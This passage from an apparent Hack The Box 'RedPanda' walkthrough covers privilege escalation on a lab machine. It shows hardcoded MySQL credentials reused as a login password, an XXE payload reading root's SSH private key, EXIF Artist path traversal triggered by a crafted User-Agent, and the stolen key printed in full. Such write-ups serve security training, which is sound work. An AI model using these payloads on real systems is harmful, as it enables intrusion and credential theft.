        }
  @GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
        public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

                System.out.println("Exporting xml of: " + author);
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
                        System.out.println(in);
                        return IOUtils.toByteArray(in);
                }
                else
                {
                        return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
                }
        }
  @PostMapping("/search")
        public ModelAndView search(@RequestParam("name") String name, Model model) {
        if(name.isEmpty())
        {
                name = "Greg";
        }
        String query = filter(name);
        ArrayList pandas = searchPanda(query);
        System.out.println("\n\""+query+"\"\n");
        model.addAttribute("query", query);
        model.addAttribute("pandas", pandas);
        model.addAttribute("n", pandas.size());
        return new ModelAndView("search.html");
        }
  public String filter(String arg) {
        String[] no_no_words = {"%", "_","$", "~", };
        for (String word : no_no_words) {
            if(arg.contains(word)){
                return "Error occured: banned characters";
            }
        }
        return arg;
    }
    public ArrayList searchPanda(String query) {

        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList<ArrayList> pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()){
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
                panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        }catch(Exception e){ System.out.println(e);}
        return pandas;
    }
}

```
We got some credentials found for mysql in this row:
```
DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
```
We can try this for the SSH service or the `sudo -l` command
```bash
woodenk@redpanda:/opt$ sudo -l
sudo -l
[sudo] password for woodenk: RedPandazRule

Sorry, user woodenk may not run sudo on redpanda.

```
The user is not allowed to run anything as `sudo`, but we could confirm the password is correct for the user. Those actions did not help us yet. Now we should check the logparser directory with the jar files.
```bash
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cd /opt/credit-score/LogParser/
cd /opt/credit-score/LogParser/

```
Let's run the `find .` command to list all files under the current folder.

```bash
woodenk@redpanda:/opt/credit-score/LogParser$ find .
find .
.
./final
./final/pom.xml.bak
./final/target
./final/target/generated-sources
./final/target/generated-sources/annotations
./final/target/final-1.0-jar-with-dependencies.jar
./final/target/maven-status
./final/target/maven-status/maven-compiler-plugin
./final/target/maven-status/maven-compiler-plugin/compile
./final/target/maven-status/maven-compiler-plugin/compile/default-compile
./final/target/maven-status/maven-compiler-plugin/compile/default-compile/inputFiles.lst
./final/target/maven-status/maven-compiler-plugin/compile/default-compile/createdFiles.lst
./final/target/archive-tmp
./final/target/classes
./final/target/classes/com
./final/target/classes/com/logparser
./final/target/classes/com/logparser/App.class
./final/.mvn
./final/.mvn/wrapper
./final/.mvn/wrapper/maven-wrapper.jar
./final/.mvn/wrapper/maven-wrapper.properties
./final/.mvn/wrapper/MavenWrapperDownloader.java
./final/pom.xml
./final/mvnw
./final/src
./final/src/test
./final/src/test/java
./final/src/test/java/com
./final/src/test/java/com/logparser
./final/src/test/java/com/logparser/AppTest.java
./final/src/main
./final/src/main/java
./final/src/main/java/com
./final/src/main/java/com/logparser
./final/src/main/java/com/logparser/App.java
woodenk@redpanda:/opt/credit-score/LogParser$ 

```

Based on the results, there are two files interesting to read:
- `./final/target/classes/com/logparser/App.class`
- `./final/src/main/java/com/logparser/App.java`

Let's read the source code of the second file first.
```bash
cat /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java
package com.logparser;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {
    
            
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}

```
This line of code:`String xmlPath = "/credits/" + artist + "_creds.xml";` tells us how the filename should look like. But this line is a good indicator we should try an XXE injection as well. The variable artis is retrieved from the metadata within an image. We can edit metadata with the tool exiftool.
## Privilege escalation
Since we have already a XML file downloaded from the system earlier, we should try to adjust it and upload to the victim.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ mv ~/Downloads/export.xml .

┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ cp export.xml export.bak                                                     

┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ nano export.xml 

┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ cat export.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE author [<!ENTITY xxe SYSTEM 'file:///root/.ssh/id_rsa'>]>
<credits>
  <author>&xxe;</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>

```

Let's save an image for the new author and adjust the metadata.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ wget $ip:8080/img/smooch.jpg
--2024-05-20 11:55:10--  http://10.129.227.207:8080/img/smooch.jpg
Connecting to 10.129.227.207:8080... connected.
HTTP request sent, awaiting response... 200 
Length: 195963 (191K) [image/jpeg]
Saving to: ‘smooch.jpg’

smooch.jpg                                                 100%[========================================================================================================================================>] 191.37K  --.-KB/s    in 0.06s   

2024-05-20 11:55:10 (3.03 MB/s) - ‘smooch.jpg’ saved [195963/195963]

┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ exiftool -Artist smooch.jpg
Artist                          : woodenk

┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ exiftool -Artist='../tmp/attack' smooch.jpg 
    1 image files updated

```
Now we should download the image to the victim as well.
```bash
woodenk@redpanda:/tmp$ wget http://10.10.14.17/smooch.jpg
                       wget http://10.10.14.17/smooch.jpg
wget http://10.10.14.17/smooch.jpg
--2024-05-20 09:57:07--  http://10.10.14.17/smooch.jpg
Connecting to 10.10.14.17:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 195969 (191K) [image/jpeg]
Saving to: ‘smooch.jpg’

smooch.jpg                                        100%[=============================================================================================================>] 191.38K  --.-KB/s    in 0.03s   

2024-05-20 09:57:07 (5.83 MB/s) - ‘smooch.jpg’ saved [195969/195969]

woodenk@redpanda:/tmp$ 

```
We should trigger our attack with the `curl` command.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ curl -A "evil||/../../../../../../../../../../tmp/smooch.jpg" http://$ip:8080/         
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta author="wooden_k">
    <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
    <link rel="stylesheet" href="css/panda.css" type="text/css">
    <link rel="stylesheet" href="css/main.css" type="text/css">
    <title>Red Panda Search | Made with Spring Boot</title>
  </head>
  <body>

    <div class='pande'>
      <div class='ear left'></div>
      <div class='ear right'></div>
      <div class='whiskers left'>
          <span></span>
          <span></span>
          <span></span>
      </div>
      <div class='whiskers right'>
        <span></span>
        <span></span>
        <span></span>
      </div>
      <div class='face'>
        <div class='eye left'></div>
        <div class='eye right'></div>
        <div class='eyebrow left'></div>
        <div class='eyebrow right'></div>

        <div class='cheek left'></div>
        <div class='cheek right'></div>

        <div class='mouth'>
          <span class='nose'></span>
          <span class='lips-top'></span>
        </div>
      </div>
    </div>
    <h1>RED PANDA SEARCH</h1>
    <div class="wrapper" >
    <form class="searchForm" action="/search" method="POST">
    <div class="wrap">
      <div class="search">
        <input type="text" name="name" placeholder="Search for a red panda">
        <button type="submit" class="searchButton">
          <i class="fa fa-search"></i>
        </button>
      </div>
    </div>
    </form>
    </div>
  </body>
</html>

```
After a couple of minutes we should be able to capture the SSH key from the root user in our XML file.
```bash
woodenk@redpanda:/tmp$ cat attack_creds.xml
                       cat attack_creds.xml
cat attack_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE author>
<credits>
  <author>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>

```
To logon to the SSH service we need to copy the content of the SSH key and paste it into a file on our attacker machine.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ nano id_rsa

┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ cat id_rsa        
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----
```
Now we have to set the correct permissions on the SSH key for the root user.
```
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ chmod 600 id_rsa 
```
Since everything is set we can try to logon to the victim as root user.
```
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ ssh root@$ip -i id_rsa       
The authenticity of host '10.129.227.207 (10.129.227.207)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.227.207' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 20 May 2024 09:41:02 AM UTC

  System load:           0.0
  Usage of /:            80.9% of 4.30GB
  Memory usage:          45%
  Swap usage:            0%
  Processes:             217
  Users logged in:       0
  IPv4 address for eth0: 10.129.227.207
  IPv6 address for eth0: dead:beef::250:56ff:fe94:abcc


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jun 30 13:17:41 2022
root@redpanda:~# 

```
Now one more step left. We should capture the proof on the target. We should do that like we want to pwn the OSCP exam.
```bash
root@redpanda:~# whoami;id;hostname;ip a ;cat root.txt
root
uid=0(root) gid=0(root) groups=0(root)
redpanda
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:ab:cc brd ff:ff:ff:ff:ff:ff
    inet 10.129.227.207/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2738sec preferred_lft 2738sec
    inet6 dead:beef::250:56ff:fe94:abcc/64 scope global dynamic mngtmpaddr 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:fe94:abcc/64 scope link 
       valid_lft forever preferred_lft forever
<HERE IS THE ROOT FLAG>
root@redpanda:~# 

```

In conclusion, RedPanda from Hack The Box was a thrilling challenge that put our skills to the test. By exploiting the Server-Side Template Injection (SSTI) vulnerability in the Java Spring Boot search engine, we were able to gain an initial foothold on the system. But the real prize came when we discovered the XXE-injectable Java program running as a cron job under the `root` user. By cleverly exploiting this vulnerability, we were able to steal the SSH private key for the `root` user and ultimately gain root access to the system.

This challenge was an excellent opportunity to practice our skills in SSTI and XXE injection, two critical web application security vulnerabilities. Moreover, it demonstrated the importance of secure coding practices and the devastating consequences of neglecting input validation.

For those preparing for the Offensive Security Web Assessor (OSWA) certification, RedPanda is an excellent machine to practice on. It simulates real-world scenarios and requires a deep understanding of web application security vulnerabilities and exploitation techniques. By mastering the skills required to own RedPanda, you'll be well-prepared to take on the challenges of the OSWA exam and become a proficient web application security professional.